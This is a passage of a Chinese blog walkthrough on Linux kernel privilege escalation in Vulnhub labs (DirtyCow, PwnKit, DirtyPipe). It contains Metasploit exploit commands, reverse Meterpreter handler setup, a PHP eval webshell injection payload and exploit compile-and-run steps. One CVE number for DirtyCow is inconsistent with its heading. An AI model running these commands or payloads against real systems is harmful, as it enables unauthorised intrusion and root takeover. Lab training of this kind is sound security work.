<!DOCTYPE html>
<html lang="en"><head>
    <link rel="stylesheet" href="/css/custom.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>内核溢出漏洞提权</title>
    <meta charset="utf-8">
    <meta name="description" content="Ladder@内核溢出漏洞提权 - Hzhsec home">
    <meta name="author" content="hzhsec">
    <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">

    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">

    


<script async defer data-website-id="3bfa7bff-77f4-4fe9-ad96-a44d83f72465" src="https://umami-evtq.vercel.app/baize"></script>

    <meta property="og:title" content="内核溢出漏洞提权" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" /><meta property="article:section" content="list" />
<meta property="article:published_time" content="2025-11-16T16:00:00+08:00" />
<meta property="article:modified_time" content="2025-11-16T16:00:00+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="内核溢出漏洞提权"/>
<meta name="twitter:description" content=""/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "目录",
      "item": "http://www.hzhsec.top/list/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "内核溢出漏洞提权",
      "item": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "内核溢出漏洞提权",
  "name": "内核溢出漏洞提权",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": " ⚠️ 本文内容仅用于 合法授权、实验靶场与学习环境，禁止用于任何未授权系统，否则后果自负。\n一、信息收集 ① 查看系统发行版信息 hostnamectl cat /etc/*-release lsb_release -a cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat cat /etc/centos-release # CentOS cat /etc/os-release # Ubuntu cat /etc/issue ② 查看内核版本信息 hostnamectl uname -a cat /proc/version dmesg | grep \"Linux version\" 二、内核漏洞筛选思路 1️⃣ Metasploit 模块检测 run post/multi/recon/local_exploit_suggester 2️⃣ 常用提权辅助脚本 分类 项目 单独提权脚本 https://github.com/liamg/traitor https://github.com/The-Z-Labs/linux-exploit-suggester https://github.com/jondonas/linux-exploit-suggester-2 https://github.com/belane/linux-soft-exploit-suggester 综合枚举脚本 https://github.com/carlospolop/PEASS-ng https://github.com/diego-treitos/linux-smart-enumeration https://github.com/redcode-labs/Bashark https://github.com/rebootuser/LinEnum 三、应用场景 当拿到 Webshell / 低权限反弹 Shell 后，可尝试利用当前环境中存在的 内核漏洞 实现 本地提权。\n四、常见内核提权漏洞案例 dirtycow（CVE-2016-5159） Pwnkit (CVE-2021-4034) Dirty Pipe（CVE-2022-0847) SUDO （CVE-2021-3156） 大脏牛 (CVE-2017–1000405) CVE-2017-16995 CVE-2021-3560 CVE-2023-1829 CVE-2022-2588 CVE-2021-3493 CVE-2022-32250 CVE-2023-3269 CVE-2022-0995 CVE-2022-2639 CVE-2023-0386 关键词：辅助项目 / Vulnhub / Dcow / Pwnkit / DirtyPipe\n五、内核溢出 - DirtyCow（CVE-2016-5195） ① 靶场环境 来源： https://www.vulnhub.com/entry/lampiao-1,249/\n② 信息收集 nmap -p1-65535 192.168.88.0/24 ③ Web 漏洞利用 发现 CMS\n使用历史漏洞：\nsearch drupal use exploit/unix/webapp/drupal_drupalgeddon2 set rhost 192.168.46.144 set rport 1898 run 成功获取权限\n④ 内核漏洞检测 upload /root/linux-exploit-suggester.sh /tmp/1.sh shell cd /tmp chmod +x 1.sh ./1.sh linpeas 扫描\nlinux-exploit-suggester.sh\n重点观察 红色/醒目提示项。\n⑤ 获取 exploit 代码 来源：\nhttps://github.com/gbonacini/CVE-2016-5195 上传 exploit：\nupload /root/dcow.cpp /tmp/dcow.cpp 编译：\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil 执行提权：\npython -c 'import pty; pty.spawn(\"/bin/bash\")' ./dcow su root 成功截图：\n六、内核溢出 - Pwnkit（CVE-2021-4034） 靶场环境： https://www.vulnhub.com/entry/darkhole-1,724/\n① 信息收集 nmap -p1-65535 192.168.88.0/24 ② Web 漏洞利用 上传 WebShell 并反弹 Meterpreter：\nuse exploit/multi/handler set payload php/meterpreter/reverse_tcp set lhost 0.0.0.0 set lport 6666 run ③ 本地提权 upload /root/linux-exploit-suggester.sh /tmp/1.sh shell cd /tmp chmod +x 1.sh ./1.sh 搜索模块：\nsearch cve_2021_4034 利用：\nuse exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec set session x run 成功截图：\n七、内核溢出 - DirtyPipe（CVE-2022-0847） 靶场环境： https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/\n① 信息收集 nmap -p1-65535 192.168.139.0/24 ② Web 漏洞利用 目录扫描：\ngobuster dir -u http://192.168.88.140/ -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 抓包写 WebShell：\nmessage=\u003c?php eval($_POST[\"pass\"]);?\u003e\u0026file=xd.php 反弹 Shell：\nuse exploit/multi/handler set payload php/meterpreter/reverse_tcp set lhost 0.0.0.0 set lport 6666 run ③ 本地提权 上传：\nupload /root/linux-exploit-suggester.sh /tmp/1.sh 执行：\ncd /tmp chmod +x 1.sh ./1.sh 使用 MSF：\nsearch cve_2022_0847 use exploit/linux/local/cve_2022_0847_dirtypipe set session x set lhost xx.xx.xx.xx run 成功截图：\n八、补充参考 CVE-2023-0386 参考文章： https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q ",
  "wordCount" : "302",
  "inLanguage": "en",
  "datePublished": "2025-11-16T16:00:00+08:00",
  "dateModified": "2025-11-16T16:00:00+08:00",
  "author":{
    "@type": "Person",
    "name": "hzhsec"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Hzhsec home",
    "logo": {
      "@type": "ImageObject",
      "url": "http://www.hzhsec.top/favicon.ico"
    }
  }
}
</script>
    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">

<link rel="apple-touch-icon" href="/static/hzhsec.png">

<link rel="manifest" href="/static/hzhsec.png">
    

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />

    
    
    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />

    
    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />

    
    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
    <script>hljs.highlightAll();</script>

    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
    </head>
<body>
      <main class="wrapper"><nav class="navigation">
    <section class="container">
        <a class="navigation-brand" href="/">
            主页
        </a>
        <input type="checkbox" id="menu-toggle" />
        <label class="menu-button float-right" for="menu-toggle">
            <span></span><span></span><span></span>
        </label>
        
        <ul class="navigation-list" id="navigation-list">
            
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/list/">目录</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/archives/">归档</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/message/">关于</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/categories/">分类</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
            </li>
            
            

            <li class="navigation-item menu-separator">
                <span>|</span>
            </li>

            
            
            <li class="navigation-item navigation-social">
                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
    </svg>
    </a>
            </li>
            
            <li class="navigation-item navigation-social">
                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
    </svg>
    </a>
            </li>
            
            

            <li class="navigation-item navigation-dark">
                <button id="mode" type="button" aria-label="toggle user light or dark theme">
                    <span class="toggle-dark">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                        </svg>
                    </span>
                    <span class="toggle-light">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
                            <circle cx="12" cy="12" r="5"></circle>
                            <line x1="12" y1="1" x2="12" y2="3"></line>
                            <line x1="12" y1="21" x2="12" y2="23"></line>
                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                            <line x1="1" y1="12" x2="3" y2="12"></line>
                            <line x1="21" y1="12" x2="23" y2="12"></line>
                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                        </svg>
                    </span>
                </button>
            </li>
            
        </ul>
        
    </section>
</nav>

<div id="content">
<article class="blog-single">
  <header class="blog-title">
    <h1>内核溢出漏洞提权</h1>
  </header>

  <p>
  <small>
    November 16, 2025&nbsp;· 302 words&nbsp;· 2 min</small>

  
<p>

  <div class="blog-toc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#一信息收集">一、信息收集</a>
      <ul>
        <li><a href="#-查看系统发行版信息">① 查看系统发行版信息</a></li>
        <li><a href="#-查看内核版本信息">② 查看内核版本信息</a></li>
      </ul>
    </li>
    <li><a href="#二内核漏洞筛选思路">二、内核漏洞筛选思路</a>
      <ul>
        <li><a href="#1-metasploit-模块检测">1️⃣ Metasploit 模块检测</a></li>
        <li><a href="#2-常用提权辅助脚本">2️⃣ 常用提权辅助脚本</a></li>
      </ul>
    </li>
    <li><a href="#三应用场景">三、应用场景</a></li>
    <li><a href="#四常见内核提权漏洞案例">四、常见内核提权漏洞案例</a></li>
    <li><a href="#五内核溢出---dirtycowcve-2016-5195">五、内核溢出 - DirtyCow（CVE-2016-5195）</a>
      <ul>
        <li><a href="#-靶场环境">① 靶场环境</a></li>
        <li><a href="#-信息收集">② 信息收集</a></li>
        <li><a href="#-web-漏洞利用">③ Web 漏洞利用</a></li>
        <li><a href="#-内核漏洞检测">④ 内核漏洞检测</a></li>
        <li><a href="#-获取-exploit-代码">⑤ 获取 exploit 代码</a></li>
      </ul>
    </li>
    <li><a href="#六内核溢出---pwnkitcve-2021-4034">六、内核溢出 - Pwnkit（CVE-2021-4034）</a>
      <ul>
        <li><a href="#-信息收集-1">① 信息收集</a></li>
        <li><a href="#-web-漏洞利用-1">② Web 漏洞利用</a></li>
        <li><a href="#-本地提权">③ 本地提权</a></li>
      </ul>
    </li>
    <li><a href="#七内核溢出---dirtypipecve-2022-0847">七、内核溢出 - DirtyPipe（CVE-2022-0847）</a>
      <ul>
        <li><a href="#-信息收集-2">① 信息收集</a></li>
        <li><a href="#-web-漏洞利用-2">② Web 漏洞利用</a></li>
        <li><a href="#-本地提权-1">③ 本地提权</a></li>
      </ul>
    </li>
    <li><a href="#八补充参考">八、补充参考</a></li>
  </ul>
</nav>
  </div>

  <section class="blog-content"><blockquote>
<p>⚠️ 本文内容仅用于 <strong>合法授权、实验靶场与学习环境</strong>，禁止用于任何未授权系统，否则后果自负。</p>
</blockquote>
<hr>
<h2 id="一信息收集">一、信息收集</h2>
<h3 id="-查看系统发行版信息">① 查看系统发行版信息</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hostnamectl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /etc/*-release
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lsb_release -a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /etc/lsb-release <span style="color:#75715e"># Debian</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /etc/redhat-release <span style="color:#75715e"># Redhat</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /etc/centos-release <span style="color:#75715e"># CentOS</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /etc/os-release <span style="color:#75715e"># Ubuntu</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /etc/issue
</span></span></code></pre></div><h3 id="-查看内核版本信息">② 查看内核版本信息</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hostnamectl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>uname -a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /proc/version
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dmesg | grep <span style="color:#e6db74">&#34;Linux version&#34;</span>
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 173946.png" alt="屏幕截图 2025-10-25 173946.png"></p>
<hr>
<h2 id="二内核漏洞筛选思路">二、内核漏洞筛选思路</h2>
<h3 id="1-metasploit-模块检测">1️⃣ Metasploit 模块检测</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>run post/multi/recon/local_exploit_suggester
</span></span></code></pre></div><h3 id="2-常用提权辅助脚本">2️⃣ 常用提权辅助脚本</h3>
<table>
<thead>
<tr>
<th>分类</th>
<th>项目</th>
</tr>
</thead>
<tbody>
<tr>
<td>单独提权脚本</td>
<td><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></td>
</tr>
<tr>
<td>综合枚举脚本</td>
<td><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="三应用场景">三、应用场景</h2>
<p>当拿到 <strong>Webshell / 低权限反弹 Shell</strong> 后，可尝试利用当前环境中存在的 <strong>内核漏洞</strong> 实现 <strong>本地提权</strong>。</p>
<hr>
<h2 id="四常见内核提权漏洞案例">四、常见内核提权漏洞案例</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dirtycow（CVE-2016-5159）
</span></span><span style="display:flex;"><span>Pwnkit (CVE-2021-4034)
</span></span><span style="display:flex;"><span>Dirty Pipe（CVE-2022-0847)
</span></span><span style="display:flex;"><span>SUDO （CVE-2021-3156）
</span></span><span style="display:flex;"><span>大脏牛 (CVE-2017–1000405)
</span></span><span style="display:flex;"><span>CVE-2017-16995
</span></span><span style="display:flex;"><span>CVE-2021-3560
</span></span><span style="display:flex;"><span>CVE-2023-1829
</span></span><span style="display:flex;"><span>CVE-2022-2588
</span></span><span style="display:flex;"><span>CVE-2021-3493
</span></span><span style="display:flex;"><span>CVE-2022-32250
</span></span><span style="display:flex;"><span>CVE-2023-3269
</span></span><span style="display:flex;"><span>CVE-2022-0995
</span></span><span style="display:flex;"><span>CVE-2022-2639
</span></span><span style="display:flex;"><span>CVE-2023-0386
</span></span></code></pre></div><p>关键词：<code>辅助项目 / Vulnhub / Dcow / Pwnkit / DirtyPipe</code></p>
<hr>
<h2 id="五内核溢出---dirtycowcve-2016-5195">五、内核溢出 - DirtyCow（CVE-2016-5195）</h2>
<h3 id="-靶场环境">① 靶场环境</h3>
<p>来源：
<a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p>
<h3 id="-信息收集">② 信息收集</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -p1-65535 192.168.88.0/24
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 164110.png" alt="屏幕截图 2025-10-25 164110.png"></p>
<h3 id="-web-漏洞利用">③ Web 漏洞利用</h3>
<p>发现 CMS</p>
<p align="center"><img src="/static/Pasted image 20251025164212.png" alt="Pasted image 20251025164212.png"></p>
<p>使用历史漏洞：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search drupal
</span></span><span style="display:flex;"><span>use exploit/unix/webapp/drupal_drupalgeddon2
</span></span><span style="display:flex;"><span>set rhost 192.168.46.144
</span></span><span style="display:flex;"><span>set rport 1898
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 164303.png" alt="屏幕截图 2025-10-25 164303.png"></p>
<p>成功获取权限</p>
<p align="center"><img src="/static/屏幕截图 2025-10-25 164341.png" alt="屏幕截图 2025-10-25 164341.png"></p>
<h3 id="-内核漏洞检测">④ 内核漏洞检测</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>upload /root/linux-exploit-suggester.sh /tmp/1.sh
</span></span><span style="display:flex;"><span>shell
</span></span><span style="display:flex;"><span>cd /tmp
</span></span><span style="display:flex;"><span>chmod +x 1.sh
</span></span><span style="display:flex;"><span>./1.sh
</span></span></code></pre></div><p><code>linpeas</code> 扫描</p>
<p align="center"><img src="/static/屏幕截图 2025-10-25 165014.png" alt="屏幕截图 2025-10-25 165014.png"></p>
<p><code>linux-exploit-suggester.sh</code></p>
<p align="center"><img src="/static/屏幕截图 2025-10-25 165535.png" alt="屏幕截图 2025-10-25 165535.png"></p>
<p>重点观察 <strong>红色/醒目提示项</strong>。</p>
<h3 id="-获取-exploit-代码">⑤ 获取 exploit 代码</h3>
<p>来源：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://github.com/gbonacini/CVE-2016-5195
</span></span></code></pre></div><p>上传 exploit：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>upload /root/dcow.cpp /tmp/dcow.cpp
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 165954.png" alt="屏幕截图 2025-10-25 165954.png"></p>
<p>编译：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 170116.png" alt="屏幕截图 2025-10-25 170116.png"></p>
<p>执行提权：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span style="display:flex;"><span>./dcow
</span></span><span style="display:flex;"><span>su root
</span></span></code></pre></div><p>成功截图：</p>
<p align="center"><img src="/static/屏幕截图 2025-10-25 170208.png" alt="屏幕截图 2025-10-25 170208.png"></p>
<hr>
<h2 id="六内核溢出---pwnkitcve-2021-4034">六、内核溢出 - Pwnkit（CVE-2021-4034）</h2>
<p>靶场环境：
<a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></p>
<h3 id="-信息收集-1">① 信息收集</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nmap -p1-65535 192.168.88.0/24
</span></span></code></pre></div><h3 id="-web-漏洞利用-1">② Web 漏洞利用</h3>
<p>上传 WebShell 并反弹 Meterpreter：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>use exploit/multi/handler 
</span></span><span style="display:flex;"><span>set payload php/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>set lhost 0.0.0.0
</span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">6666</span>
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><h3 id="-本地提权">③ 本地提权</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>upload /root/linux-exploit-suggester.sh /tmp/1.sh
</span></span><span style="display:flex;"><span>shell
</span></span><span style="display:flex;"><span>cd /tmp
</span></span><span style="display:flex;"><span>chmod +x 1.sh
</span></span><span style="display:flex;"><span>./1.sh
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 174146.png" alt="屏幕截图 2025-10-25 174146.png"></p>
<p>搜索模块：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search cve_2021_4034
</span></span></code></pre></div><p>利用：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
</span></span><span style="display:flex;"><span>set session x
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p>成功截图：</p>
<p align="center"><img src="/static/屏幕截图 2025-10-25 174621.png" alt="屏幕截图 2025-10-25 174621.png"></p>
<p align="center"><img src="/static/屏幕截图 2025-10-25 174644.png" alt="屏幕截图 2025-10-25 174644.png"></p>
<hr>
<h2 id="七内核溢出---dirtypipecve-2022-0847">七、内核溢出 - DirtyPipe（CVE-2022-0847）</h2>
<p>靶场环境：
<a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p>
<h3 id="-信息收集-2">① 信息收集</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nmap -p1-65535 192.168.139.0/24
</span></span></code></pre></div><h3 id="-web-漏洞利用-2">② Web 漏洞利用</h3>
<p>目录扫描：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u http://192.168.88.140/ -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 175519.png" alt="屏幕截图 2025-10-25 175519.png"></p>
<p>抓包写 WebShell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>message=&lt;?php eval($_POST[&#34;pass&#34;]);?&gt;&amp;file=xd.php
</span></span></code></pre></div><p>反弹 Shell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>use exploit/multi/handler
</span></span><span style="display:flex;"><span>set payload php/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>set lhost 0.0.0.0
</span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">6666</span>
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 180059.png" alt="屏幕截图 2025-10-25 180059.png"></p>
<h3 id="-本地提权-1">③ 本地提权</h3>
<p>上传：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>upload /root/linux-exploit-suggester.sh /tmp/1.sh
</span></span></code></pre></div><p>执行：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cd /tmp
</span></span><span style="display:flex;"><span>chmod +x 1.sh
</span></span><span style="display:flex;"><span>./1.sh
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 180208.png" alt="屏幕截图 2025-10-25 180208.png"></p>
<p>使用 MSF：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search cve_2022_0847
</span></span><span style="display:flex;"><span>use exploit/linux/local/cve_2022_0847_dirtypipe
</span></span><span style="display:flex;"><span>set session x
</span></span><span style="display:flex;"><span>set lhost xx.xx.xx.xx
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 180612.png" alt="屏幕截图 2025-10-25 180612.png"></p>
<p>成功截图：</p>
<p align="center"><img src="/static/屏幕截图 2025-10-25 180711.png" alt="屏幕截图 2025-10-25 180711.png"></p>
<hr>
<h2 id="八补充参考">八、补充参考</h2>
<ul>
<li>CVE-2023-0386</li>
<li>参考文章：
